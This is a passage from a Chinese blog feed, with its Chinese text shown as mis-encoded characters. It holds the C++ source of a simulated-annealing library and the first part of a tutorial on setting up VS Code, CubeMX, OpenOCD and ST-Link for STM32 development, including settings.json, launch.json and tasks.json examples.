            typename NeighborFunc = DefaultNeighbor&lt;State&gt;,
            typename CoolingPolicy = ExponentialCooling,
            typename ConstraintPolicy = std::nullptr_t
    &gt;
    auto solve(
            const State&amp; initial_state,
            EnergyFunc energy_func,
            Params params = Params{},
            NeighborFunc neighbor = NeighborFunc{},
            CoolingPolicy cooling = CoolingPolicy{},
            ConstraintPolicy constraint = ConstraintPolicy{}
    ) {
        using AcceptancePolicy = MetropolisAcceptance;

        detail::Solver&lt;State, EnergyFunc, NeighborFunc, CoolingPolicy, AcceptancePolicy, ConstraintPolicy&gt;
                solver(params, energy_func, neighbor, cooling, AcceptancePolicy{}, constraint);

        return solver.solve(initial_state);
    }

} // namespace sa

#endif // SA_SA_HPP
</code></pre>
<p>policies.hpp</p>
<pre><code>#ifndef SA_POLICIES_HPP
#define SA_POLICIES_HPP

#include "params.hpp"
#include "detail/traits.hpp"

#include &lt;cmath&gt;
#include &lt;random&gt;
#include &lt;algorithm&gt;
#include &lt;stdexcept&gt;
#include &lt;vector&gt;

namespace sa {

    // é»è®¤éæ¸©ç­ç¥
    struct ExponentialCooling {
        inline double operator()(double T, const Params&amp; p) const noexcept {
            return T * p.alpha;
        }
    };


    // é»è®¤æ¥åç­ç¥ (Metropolis åå)
    struct MetropolisAcceptance {
        template&lt;typename RNG&gt;
        bool operator()(double delta_E,
                        double T,
                        RNG&amp; rng,
                        std::uniform_real_distribution&lt;double&gt;&amp; dist) const
        {
            if (delta_E &lt; 0.0) return true;
            return std::exp(-delta_E / T) &gt; dist(rng);
        }
    };


    // é»è®¤è¿ç»­é»åçæç­ç¥
    template&lt;typename State&gt;
    struct DefaultNeighbor {
        double sigma = 1.0;

        State operator()(const State&amp; current,
                         double T,
                         std::mt19937&amp; rng) const
        {
            if constexpr (std::is_arithmetic_v&lt;State&gt;) {
                std::normal_distribution&lt;double&gt; dist(0.0, sigma * T);
                return static_cast&lt;State&gt;(current + dist(rng));
            }
            else if constexpr (detail::is_std_vector_v&lt;State&gt;) {
                using ValueType = typename State::value_type;
                static_assert(std::is_arithmetic_v&lt;ValueType&gt;,
                              "vector value type must be arithmetic");

                std::normal_distribution&lt;double&gt; dist(0.0, sigma * T);
                State candidate = current;
                for (auto&amp; v : candidate)
                    v = static_cast&lt;ValueType&gt;(v + dist(rng));
                return candidate;
            }
            else {
                static_assert(sizeof(State) == 0, "No default neighbor for this State type");
                return current;
            }
        }
    };


    // ç¦»æ£ç¿»è½¬é»åç­ç¥ (éå¯¹ vector&lt;bool&gt; æ vector&lt;int&gt;)
    template&lt;typename State&gt;
    struct DiscreteFlipNeighbor {
        State operator()(const State&amp; current,
                         double T,
                         std::mt19937&amp; rng) const
        {
            static_assert(detail::is_std_vector_v&lt;State&gt;, "DiscreteFlipNeighbor requires std::vector");
            using ValueType = typename State::value_type;

            static_assert(
                    std::is_same_v&lt;ValueType, int&gt; || std::is_same_v&lt;ValueType, bool&gt;,
                    "DiscreteFlipNeighbor requires vector&lt;int&gt; or vector&lt;bool&gt;"
            );

            State candidate = current;
            std::uniform_int_distribution&lt;std::size_t&gt; dist(0, candidate.size() - 1);
            std::size_t idx = dist(rng);

            if constexpr (std::is_same_v&lt;ValueType, bool&gt;)
                candidate[idx] = !candidate[idx];
            else
                candidate[idx] = 1 - candidate[idx];

            return candidate;
        }
    };


    // è¾¹ççº¦æç­ç¥ (Box Constraint)
    template&lt;typename State&gt;
    class BoxConstraintPolicy {
    public:
        using ValueType = std::conditional_t&lt;
                std::is_arithmetic_v&lt;State&gt;,
                State,
                typename State::value_type&gt;;

        BoxConstraintPolicy(ValueType lower, ValueType upper)
                : lower_(lower), upper_(upper) {}

        void apply(State&amp; state) const noexcept {
            if constexpr (std::is_arithmetic_v&lt;State&gt;) {
                state = std::clamp(state, lower_, upper_);
            }
            else {
                for (auto&amp; v : state)
                    v = std::clamp(v, lower_, upper_);
            }
        }

    private:
        ValueType lower_;
        ValueType upper_;
    };

} // namespace sa

#endif // SA_POLICIES_HPP
</code></pre>
<p>params.hpp</p>
<pre><code>//
// Created by 31007 on 2026/2/12.
//

#ifndef MATH_TYPES_HPP
#define MATH_TYPES_HPP
#include &lt;cstddef&gt;
#include &lt;cstdint&gt;
namespace sa {
    struct Params {
        double      initial_temp     = 100.0;       // åå§æ¸©åº¦
        double      final_temp       = 1e-6;        // ç»æ­¢æ¸©åº¦
        double      alpha            = 0.98;        // éæ¸©ç³»æ°
        std::size_t iter_per_temp    = 100;         // æ¯ä¸ªæ¸©åº¦ä¸çè¿­ä»£æ¬¡æ°
        std::size_t max_total_iters  = 1'000'000;   // æå¤§æ»è¿­ä»£æ¬¡æ° (é²æ­¢æ­»å¾ªç¯)
        std::uint32_t seed           = 0;           // éæºç§å­ (0è¡¨ç¤ºéæº)
    };

} // namespace sa
#endif //MATH_TYPES_HPP
</code></pre>
<p>solver.hpp</p>
<pre><code>#ifndef SA_DETAIL_SOLVER_HPP
#define SA_DETAIL_SOLVER_HPP

#include "../params.hpp"
#include &lt;random&gt;
#include &lt;utility&gt;
#include &lt;stdexcept&gt;

namespace sa::detail {

    template&lt;
            typename State,
            typename EnergyFunc,
            typename NeighborFunc,
            typename CoolingPolicy,
            typename AcceptancePolicy,
            typename ConstraintPolicy
    &gt;
    class Solver {
    public:
        Solver(Params params,
               EnergyFunc energy,
               NeighborFunc neighbor,
               CoolingPolicy cooling,
               AcceptancePolicy acceptance,
               ConstraintPolicy constraint)
                : params_(params),
                  energy_(energy),
                  neighbor_(neighbor),
                  cooling_(cooling),
                  acceptance_(acceptance),
                  constraint_(constraint),
                  dist_(0.0, 1.0)
        {
            validate_params();

            if (params_.seed == 0) {
                std::random_device rd;
                rng_ = std::mt19937(rd());
            } else {
                rng_ = std::mt19937(params_.seed);
            }
        }

        std::pair&lt;State, double&gt; solve(const State&amp; initial_state) {
            State current = initial_state;
            double current_energy = energy_(current);

            State best = current;
            double best_energy = current_energy;

            double T = params_.initial_temp;
            std::size_t total_iters = 0;

            while (T &gt; params_.final_temp &amp;&amp; total_iters &lt; params_.max_total_iters) {
                for (std::size_t i = 0;
                     i &lt; params_.iter_per_temp &amp;&amp; total_iters &lt; params_.max_total_iters;
                     ++i, ++total_iters)
                {
                    State candidate = neighbor_(current, T, rng_);

                    // ç¼è¯æå¤æ­æ¯å¦å­å¨çº¦æç­ç¥
                    if constexpr (!std::is_same_v&lt;ConstraintPolicy, std::nullptr_t&gt;) {
                        constraint_.apply(candidate);
                    }

                    double candidate_energy = energy_(candidate);
                    double delta = candidate_energy - current_energy;

                    if (acceptance_(delta, T, rng_, dist_)) {
                        current = std::move(candidate);
                        current_energy = candidate_energy;

                        if (current_energy &lt; best_energy) {
                            best = current;
                            best_energy = current_energy;
                        }
                    }
                }
                T = cooling_(T, params_);
            }

            return {std::move(best), best_energy};
        }

    private:
        void validate_params() {
            if (params_.initial_temp &lt;= 0.0) throw std::invalid_argument("initial_temp must be &gt; 0");
            if (params_.final_temp &lt;= 0.0) throw std::invalid_argument("final_temp must be &gt; 0");
            if (params_.alpha &lt;= 0.0 || params_.alpha &gt;= 1.0) throw std::invalid_argument("alpha must be in (0,1)");
            if (params_.iter_per_temp == 0) throw std::invalid_argument("iter_per_temp must be &gt; 0");
        }

        Params params_;
        EnergyFunc energy_;
        NeighborFunc neighbor_;
        CoolingPolicy cooling_;
        AcceptancePolicy acceptance_;
        ConstraintPolicy constraint_;

        std::mt19937 rng_;
        std::uniform_real_distribution&lt;double&gt; dist_;
    };

} // namespace sa::detail

#endif // SA_DETAIL_SOLVER_HPP
</code></pre>
<p>traits.hpp</p>
<pre><code>#ifndef SA_DETAIL_TRAITS_HPP
#define SA_DETAIL_TRAITS_HPP

#include &lt;vector&gt;
#include &lt;type_traits&gt;

namespace sa::detail {

    // ç±»åèåï¼å¤æ­æ¯å¦ä¸º std::vector

    template&lt;typename T&gt;
    struct is_std_vector : std::false_type {};

    template&lt;typename T, typename Alloc&gt;
    struct is_std_vector&lt;std::vector&lt;T, Alloc&gt;&gt; : std::true_type {};

    template&lt;typename T&gt;
    inline constexpr bool is_std_vector_v = is_std_vector&lt;T&gt;::value;

} // namespace sa::detail

#endif // SA_DETAIL_TRAITS_HPP
</code></pre>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.008333333333333333" data-date-updated="2026-02-20 20:26">2026-02-20 20:14</span>&nbsp;
<a href="https://www.cnblogs.com/PaperPlaneFly">çº¸é£æºä½ç©ºé£è¡</a>&nbsp;
éè¯»(<span id="post_view_count">1</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19626799);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19626799', targetLink: 'https://www.cnblogs.com/PaperPlaneFly/p/19626799', title: 'æ¨¡æéç«ç®æ³' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ææææä½ ä½¿ç¨vscodeå¼åstm32ï¼ ]]></title>
    <link>https://www.cnblogs.com/chenyouyuan/p/19626759</link>
    <guid>c28d5d93a9836afb6e876ed9ea253a63</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/chenyouyuan/p/19626759" title="åå¸äº 2026-02-20 19:31">
    <span role="heading" aria-level="2">ææææä½ ä½¿ç¨vscodeå¼åstm32ï¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        å·²ç»2026å¹´äºï¼ä½ æ¯å¦è¿å¨ä½¿ç¨å¤èçkeil5çè°è¯å¢ï¼æ¯å¦è¿å¨ä¸ºkeil5å¤å¶ç²è´´ä»£ç å°èå¤©å¼aiåç²è´´åæ¥èç¦æ¼å¢ï¼å¿«å¿«å å¥vscodeå¼åstm32çå¤§é¨éæ¥ååè£çè¿åå§ï¼
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="å¼åå·¥å·éç½®ç¯è¿æ¥æ°æ¶ä»£--ä½¿ç¨vscodeå¼åstm32">å¼åå·¥å·éç½®ç¯ï¼è¿æ¥æ°æ¶ä»£--ä½¿ç¨vscodeå¼åstm32</h1>
<blockquote>
<p>å·²ç»2026å¹´äºï¼ä½ æ¯å¦è¿å¨ä½¿ç¨å¤èçkeil5çè°è¯å¢ï¼æ¯å¦è¿å¨ä¸ºkeil5å¤å¶ç²è´´ä»£ç å°èå¤©å¼aiåç²è´´åæ¥èç¦æ¼å¢ï¼å¿«å¿«å å¥vscodeå¼åstm32çå¤§é¨éæ¥ååè£çè¿åå§ï¼</p>
</blockquote>
<p></p><div class="toc"><div class="toc-container-header">ç®å½</div><ul><li><a href="#å¼åå·¥å·éç½®ç¯è¿æ¥æ°æ¶ä»£--ä½¿ç¨vscodeå¼åstm32" rel="noopener nofollow">å¼åå·¥å·éç½®ç¯ï¼è¿æ¥æ°æ¶ä»£--ä½¿ç¨vscodeå¼åstm32</a><ul><li><a href="#åè¨" rel="noopener nofollow">åè¨</a></li><li><a href="#ææä¾èµçè½¯ä»¶ç¾åº¦ç½çé¾æ¥ä»¥åéå¥bç«æææè®²è§£è§é¢" rel="noopener nofollow">ææä¾èµçè½¯ä»¶ç¾åº¦ç½çé¾æ¥ä»¥åéå¥bç«æææè®²è§£è§é¢</a></li><li><a href="#ä¸ä¸è½½cubemxä»¥åå¯¹åºstm32çhalåº" rel="noopener nofollow">ä¸ãä¸è½½cubemxä»¥åå¯¹åºstm32çhalåº</a></li><li><a href="#äºä¸è½½vscodeä»¥åæä»¶" rel="noopener nofollow">äºãä¸è½½vscodeä»¥åæä»¶</a><ul><li><a href="#stm32-for-vscode" rel="noopener nofollow">stm32 for vscode</a></li><li><a href="#makefiel" rel="noopener nofollow">makefiel</a></li></ul></li><li><a href="#ä¸stlinké©±å¨å®è£" rel="noopener nofollow">ä¸ãstlinké©±å¨å®è£</a></li><li><a href="#å-éç½®å¼åç¯å¢" rel="noopener nofollow">åã éç½®å¼åç¯å¢</a><ul><li><a href="#éç½®ç¯å¢åé" rel="noopener nofollow">éç½®ç¯å¢åé</a></li><li><a href="#å³äºlaunchjsonæä»¶" rel="noopener nofollow">å³äºlaunch.jsonæä»¶</a></li><li><a href="#å³äºtasksjsonæä»¶" rel="noopener nofollow">å³äºtasks.jsonæä»¶</a></li></ul></li><li><a href="#å¼å§è°è¯" rel="noopener nofollow">å¼å§è°è¯</a><ul><li><a href="#stm32-svdæä»¶" rel="noopener nofollow">stm32 svdæä»¶</a></li></ul></li></ul></li></ul></div><p></p>
<p>æ¬ç¯æç« ä¸»è¦åèæ¹åå¤§å­¦robomasterè·é¹¿æéççµæ§å¼æºé¨å</p>
<p><a href="https://gitee.com/hnuyuelurm/basic_framework/blob/master/.Doc/VSCode+Ozone%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95.md" target="_blank" rel="noopener nofollow">.Doc/VSCode+Ozoneä½¿ç¨æ¹æ³.md Â· HNUYueLuRM/basic_framework - Gitee.com</a></p>
<h2 id="åè¨">åè¨</h2>
<p>æ¬ç¯æç« ä¸»è¦ä½¿ç¨vscode + cubemxå¹³æ¿keil5ï¼å®ç°å¿«éå¼åãå®æ¶å¯è§ååéï¼å¨å±ï¼ãå¯ä»¥æ¥çå¯å­å¨åå®¹ãcopilotè¾å©å¼å....</p>
<p>æ¯æstlinkï¼jlinkï¼daplinkè°è¯å¨ï¼ææ¶æ²¡ææ¾å°çº¯é vscodeçå®æ¶å¯è§ååæ°æ³¢å½¢å¾åè½çæä»¶</p>
<p>å¦æå¤§å®¶è¿æå¶ä»å¥½ç¨çæ¹æ¡æ¬¢è¿è®¨è®ºå¢~</p>
<h2 id="ææä¾èµçè½¯ä»¶ç¾åº¦ç½çé¾æ¥ä»¥åéå¥bç«æææè®²è§£è§é¢">ææä¾èµçè½¯ä»¶ç¾åº¦ç½çé¾æ¥ä»¥åéå¥bç«æææè®²è§£è§é¢</h2>
<p>å¯è½ç½ç»åå å¯¼è´ä¸äºå®è£æ æ³å®æï¼æä»¥è¿è¾¹æä¾æç¨å°çææåï¼æ ¹æ®éè¦å®è£å³å¯<br>
éè¿ç½çåäº«çæä»¶ï¼all_in_one.zip<br>
é¾æ¥: <a href="https://pan.baidu.com/s/12brC2bPmu9wWa2h-VgIZmg?pwd=9xah" target="_blank" rel="noopener nofollow">https://pan.baidu.com/s/12brC2bPmu9wWa2h-VgIZmg?pwd=9xah</a> æåç : 9xah<br>
--æ¥èªç¾åº¦ç½çè¶çº§ä¼åv3çåäº«<br>
bç«è§é¢é¾æ¥<br>
<a href="https://www.bilibili.com/video/BV1ZMfGBrEFy/?vd_source=f553a12b04c16a678ddc0064cc04563c" target="_blank" rel="noopener nofollow">https://www.bilibili.com/video/BV1ZMfGBrEFy/?vd_source=f553a12b04c16a678ddc0064cc04563c</a></p>
<h2 id="ä¸ä¸è½½cubemxä»¥åå¯¹åºstm32çhalåº">ä¸ãä¸è½½cubemxä»¥åå¯¹åºstm32çhalåº</h2>
<p>cubemxå®ç½(éè¦ç®åçæ³¨åå³å¯)ï¼</p>
<p><a href="https://www.st.com/en/development-tools/stm32cubemx.html#get-software" target="_blank" rel="noopener nofollow">https://www.st.com/en/development-tools/stm32cubemx.html#get-software</a></p>
<p>ä¸è½½å®æä¹åç¹å»</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220181610339.png" alt="" loading="lazy"></p>
<p>ç´æ¥å¨æç´¢æ æç´¢ä½ ä½¿ç¨çstm32çåå·ï¼ä»¥f103ä½ä¸ºä¾å­</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220181746320.png" alt="image-20260220181746320" loading="lazy"></p>
<p>åå»è¦éæ©çæ¿å­å³å¯è¿å¥</p>
<p>å¶ä½è¯¦ç»çéç½®å¯ä»¥åèå¶ä»æç¨</p>
<p>ä¸»è¦æ³¨æçæ¯ï¼</p>
<p>sysçéç½®è¦éç½®æswæ¨¡å¼ï¼ä¸ç¶ä¼åªè½ç§å½ä¸æ¬¡</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220181938762.png" alt="image-20260220181938762" loading="lazy"></p>
<p>å¯¼åºè¿è¾¹éæ©makefile</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220182046638.png" alt="image-20260220182046638" loading="lazy"></p>
<h2 id="äºä¸è½½vscodeä»¥åæä»¶">äºãä¸è½½vscodeä»¥åæä»¶</h2>
<p>vscodeå®ç½ï¼</p>
<p><a href="https://www.st.com/en/development-tools/stm32cubemx.html#get-software" target="_blank" rel="noopener nofollow">https://www.st.com/en/development-tools/stm32cubemx.html#get-software</a></p>
<p>éè¦å®è£çvscdoeæä»¶ï¼</p>
<p>ç¹å»vscodeå·¦ä¾§çè¿ä¸ªå¾æ </p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174816604.png" alt="image-20260220174816604" loading="lazy"></p>
<h3 id="stm32-for-vscode">stm32 for vscode</h3>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220160002646.png" alt="image-20260220160002646" loading="lazy"></p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220155925565.png" alt="image-20260220155925565" loading="lazy"></p>
<p>ç¹å»install build tools</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220175156853.png" alt="image-20260220175156853" loading="lazy"></p>
<p>åºç°å¦ä¸é¡µé¢å³ä»£è¡¨å®è£æåï¼å¤§çº¦5~15åéï¼</p>
<p>å¦æç½ç»ä¸å¥½å£è¯­åæ¢ææºç­ç¹åæ¬¡å°è¯</p>
<p>è¿ä¸è¡å°±ç´æ¥ä½¿ç¨æçç¾åº¦ç½çåäº«çzipåç¼©åï¼å»ºè®®æ¾å°dçï¼å¦ææçè¯ï¼</p>
<h3 id="makefiel">makefiel</h3>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220155854381.png" alt="image-20260220155854381" loading="lazy"></p>
<h2 id="ä¸stlinké©±å¨å®è£">ä¸ãstlinké©±å¨å®è£</h2>
<p>å¦æä½ ä¹åæ²¡æä½¿ç¨è¿stlinkï¼è¯·æ ¹æ®å¦ä¸é¾æ¥å®æstlinké©±å¨çå®è£</p>
<p><a href="https://www.st.com.cn/zh/development-tools/stsw-link009.html" target="_blank" rel="noopener nofollow">STSW-LINK009 | Software - ææ³åå¯¼ä½</a><br>
æ ¹æ®èªå·±ççµèéç½®åå»ä»¥ä¸ä¸¤ä¸ªexeä¸­çä¸ä¸ª</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220184946316.png" alt="image-20260220184946316" loading="lazy"></p>
<h2 id="å-éç½®å¼åç¯å¢">åã éç½®å¼åç¯å¢</h2>
<h3 id="éç½®ç¯å¢åé">éç½®ç¯å¢åé</h3>
<ol>
<li>
<p>å¨vscodeæ¾å°æå·¦è¾¹çåä¸ªæ¹åå¾æ ï¼è¿éæ¯æä»¬å®è£æå±çå°æ¹</p>
<p>ç¹å»ä¹åæ¾å°stm32 for vscode</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174706404.png" alt="image-20260220174706404" loading="lazy"></p>
</li>
<li>
<p>æå¼è¯¦æé¡µé¢--&gt;ç¹å»å³ä¸è§èè²çç¼å­æå­ï¼æå¼ç¼å­æä»¶å¤¹</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220175025884.png" alt="image-20260220175025884" loading="lazy"></p>
<p>ç¼å­æä»¶å¤¹å¦ä¸</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220175310991.png" alt="image-20260220175310991" loading="lazy"></p>
</li>
<li>
<p>è¿å¥@å¼å¤´çæä»¶å¤¹,å¦ä¸ï¼æä»¬ä¸ºäºæ¹ä¾¿ï¼æè¯¥æä»¶å¤¹ä¸é¢ææçä¸è¥¿è¿ç§»å°Dçï¼å¦ææçè¯ï¼ï¼å¨Dçç®å½ä¸æ°å»ºä¸ä¸ªæä»¶å¤¹å«stm32toolsï¼ææä»¶å¨é¨æ¾è¿å»</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220175354956.png" alt="image-20260220175354956" loading="lazy"></p>
<p>è¿ç§»è·¯å¾å¦ä¸å¾ï¼å ä¸ºè¿ä¸ªæ¼ç¤ºçæºå¨æ²¡æådçï¼æå°±æ¾å°cçäºï¼</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220175533984.png" alt="image-20260220175533984" loading="lazy"></p>
</li>
<li>
<p>æ¥ä¸æ¥æä¸winé®ï¼å¨æç´¢æ æç´¢ç¯å¢</p>
<p>ç¹å»ç¼è¾ç³»ç»ç¯å¢åé</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174138545.png" alt="" loading="lazy"></p>
<p>ç¹å»æä¸é¢çç¯å¢åéï¼Nï¼</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174230783.png" alt="image-20260220174230783" loading="lazy"></p>
<p>åå»path</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174323481.png" alt="image-20260220174323481" loading="lazy"></p>
<p>ç¹å»å³è¾¹çæ°å»ºå³å¯æ°å»ºåéï¼ctrl+vç²è´´ä¸ä¸ªbinçè·¯å¾ï¼å¦ä¸å¾ï¼æ ¹æ®èªå·±çæä»¶ä½ç½®æ¥</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220174405199.png" alt="image-20260220174405199" loading="lazy"></p>
</li>
</ol>
<p>éç½®å®æä¹åwin + r</p>
<p>å¨å¼¹åºççªå£è¾å¥cmdï¼åè½¦</p>
<p>ç²è´´å¦ä¸æä»¤è¿è¡</p>
<pre><code class="language-cmd">arm-none-eabi-gcc -v
</code></pre>
<p>å¦æåºç°ç±»ä¼¼ä¸å¾è¾åºï¼å°±ä»£è¡¨æå</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220180204385.png" alt="image-20260220180204385" loading="lazy"></p>
<ol start="5">
<li>
<p>æå¼vscode è¿å¥å°é¡¹ç®æä»¶å¤¹ï¼åé¢åå»ºçcubemxé¡¹ç®æä»¶å¤¹ï¼</p>
</li>
<li>
<p>ctrl + ï¼æå¼è®¾ç½®ï¼æç´¢stm32 for vscode<br>
<img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220184204803.png" alt="image-20260220184204803" loading="lazy"><br>
ç¹å»å¨settings.jsonä¸­ç¼è¾,å®åå¦ä¸è·¯å¾</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220184315477.png" alt="image-20260220184315477" loading="lazy"><br>
settings.json(æ ¹æ®èªå·±çè·¯å¾éç½®)</p>
<pre><code class="language-json">{
    "stm32-for-vscode.openOCDPath": "C:\\stm32tools\\openocd\\0.12.0-7.1\\.content\\bin\\openocd.EXE",
    "stm32-for-vscode.makePath": "C:\\stm32tools\\windows-build-tools\\4.4.1-3.1\\.content\\bin\\make.EXE",
    "stm32-for-vscode.armToolchainPath": "C:\\stm32tools\\arm-none-eabi-gcc\\14.2.1-1.1.1\\.content\\bin",
    "makefile.configureOnOpen": true,
    "cortex-debug.stm32cubeprogrammer": "",
    "cortex-debug.openocdPath": "C:\\stm32tools\\openocd\\0.12.0-7.1\\.content\\bin\\openocd.EXE",
    "cortex-debug.armToolchainPath": "C:\\stm32tools\\arm-none-eabi-gcc\\14.2.1-1.1.1\\.content\\bin",
}
</code></pre>
</li>
<li>
<p>ctrl + ~</p>
<p>å¨ç»ç«¯è¾å¥make -j12 æµè¯ççè½å¦æåç¼è¯,å¦ä¸å¾å³ä»£è¡¨æåç¼è¯</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220182335492.png" alt="image-20260220182335492" loading="lazy"></p>
</li>
</ol>
<h3 id="å³äºlaunchjsonæä»¶">å³äºlaunch.jsonæä»¶</h3>
<p>å¨å·¦è¾¹æ æ¾å°è¿ä¸ªå¾æ </p>
<p><img alt="" loading="lazy"></p>
<p>ç¹å»ä¸ä¸éé¢çåå»ºlaunchæä»¶</p>
<p>å°±å¯ä»¥å¨ç®å½ç.vscodeæä»¶å¤¹ä¸æ¾å°</p>
<p><img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220160146084.png" alt="image-20260220160146084" loading="lazy"></p>
<p>æä»¬ç´æ¥å¤å¶ä¸é¢æä¿®æ¹å¥½çstlinkçä»£ç ï¼daplinkãjlinkæ¹å¤§å¼æºçgiteeä»åºå·²ç»æä¾ï¼</p>
<pre><code class="language-json">{
    // å¯å¨è°è¯çå¿«æ·é®æ¯F5
    "version": "0.2.0",
    "configurations": [
        // ä½¿ç¨dap-link(å¦æ çº¿è°è¯å¨æ¶çåèéç½®)
        {
            "name": "STlink",
            "cwd": "${workspaceRoot}",
            "executable": "${workspaceRoot}\\build\\first.elf", // è¦ä¸è½½å°è°è¯å¨çæä»¶,è±æ¬å·ä¸­çæ¯vscodeä¸¤ä¸ªé¢å®ä¹çåæ°
            "request": "launch",
            "type": "cortex-debug",
            //ä½¿ç¨J-link GDB Serveræ¶å¿é¡»;å¶ä»GBD Serveræ¶å¯éï¼æå¯è½å¸®å©èªå¨éæ©SVDæä»¶ï¼
            //æ¯æçè®¾å¤è§ https://www.segger.com/downloads/supported-devices.php
            //svdæä»¶ï¼æè¿ä¸ªæä»¶æè½æ¥çå¯å­å¨çå¼ï¼æ¯ä¸ªåçæºé½ä¸åãå¯ä»¥å¨ä»¥ä¸å°åæ¾å°https://github.com/modm-io/cmsis-svd-stm32 
            //è¯¥é¡¹ç®çæ ¹ç®å½å·²ç»æä¾äºCåå¼åæ¿ä½¿ç¨çå¤è®¾svdæä»¶
            "svdFile": "./STM32F103.svd",
            "servertype": "openocd", //ä½¿ç¨çGDB Server
            "configFiles": [
                "openocd_stlink.cfg", // éç½®æä»¶å·²ç»å¨æ ¹ç®å½æä¾,è¥è¦ä¿®æ¹ä»¥æ­¤ç±»æ¨,openocdçè·¯å¾ä¸çshare/scriptsä¸­æåç§åå¥½çéç½®æä»¶
            ],
            "runToEntryPoint": "main", // è°è¯æ¶å¨mainå½æ°å¥å£åä¸
            "preLaunchTask": "build task",//åè¿è¡Buildä»»å¡ç¼è¯é¡¹ç®,åæ¶æ³¨éå³å¯ä½¿ç¨
            "liveWatch": {
                "enabled": true,
                "samplesPerSecond": 4
            }
        },
      
    ],
}
</code></pre>
<p>éç½®å®æä¹åå¨vscodeçå·¦ä¾§debugå¾æ å³å¯çå°æ´æ¹éç½®çstlinkçéç½®<br>
<img src="http://tuchuang-cyy.oss-cn-beijing.aliyuncs.com/img/image-20260220184555431.png" alt="image-20260220184555431" loading="lazy"></p>
<h3 id="å³äºtasksjsonæä»¶">å³äºtasks.jsonæä»¶</h3>
<p>ä½ç½®ä¸launchæä»¶ä¸æ ·ï¼æ²¡æå°±æ°å»ºä¸ä¸ª</p>
<pre><code class="language-json">{
    // See https://go.microsoft.com/fwlink/?LinkId=733558
    "version": "2.0.0",
    "tasks": [
        {
            "label": "build task",         // ä»»å¡æ ç­¾
            "type": "shell",               // ä»»å¡ç±»å,å ä¸ºè¦è°ç¨mingw32-make,æ¯å¨ç»ç«¯(CMD)éè¿è¡ç,æä»¥æ¯shellä»»å¡
            "command": "make -j24",// ä»»å¡å½ä»¤,çº¿ç¨æ°å¯ä»¥æ ¹æ®èªå·±ççµèä¿®æ¹,å»ºè®®ä¸cpuæ ¸æ°ç¸å
            "problemMatcher": [],          
            "group": {
                "kind": "build",
                "isDefault": true
            }
        },
        {
            "label": "download dap",
            "type": "shell",               // å¦æå¸æå¨ä¸è½½åç¼è¯,å¯ä»¥æcommandæ¢æä¸é¢çå½ä»¤
            "command":"make -j24 ; make download_dap", // "mingw32-make -j24 ; mingw32-make download_dap",
            "group": {                     // å¦ææ²¡æä¿®æ¹ä»£ç ,ç¼è¯ä»»å¡ä¸ä¼æ¶èæ¶é´,å æ­¤æ¨èä½¿ç¨ä¸é¢çæ¿æ¢.
                "kind": "build",
                "isDefault": false,
            },
        },
        {
            "label": "download jlink", // è¦ä½¿ç¨æ­¤ä»»å¡,éæ·»å jlinkçç¯å¢åé
            "type": "shell",
            "command":"make -j24 ; make download_jlink", // "mingw32-make -j24 ; mingw32-make download_jlink"
            "group": {
                "kind": "build",
                "isDefault": false,
            }
        },
        {
            "label": "log",
            "type": "shell",
            "command":"JlinkRTTClient",
            "args": [],
            "problemMatcher": [],
            // "dependsOn":[
            //     "build task", // å¯ä»¥æ·»å å¤ä¸ª.
            // ]
            // è¥ä½¿ç¨daplink,åå°logä»»å¡è®¾ç½®ä¸ºä¾èµäºjlink launchä»»å¡,ä¿è¯jlink launchä»»å¡åäºlogä»»å¡æ§è¡
        }
    ]
}
</code></pre>
<h2 id="å¼å§è°è¯">å¼å§è°è¯</h2>
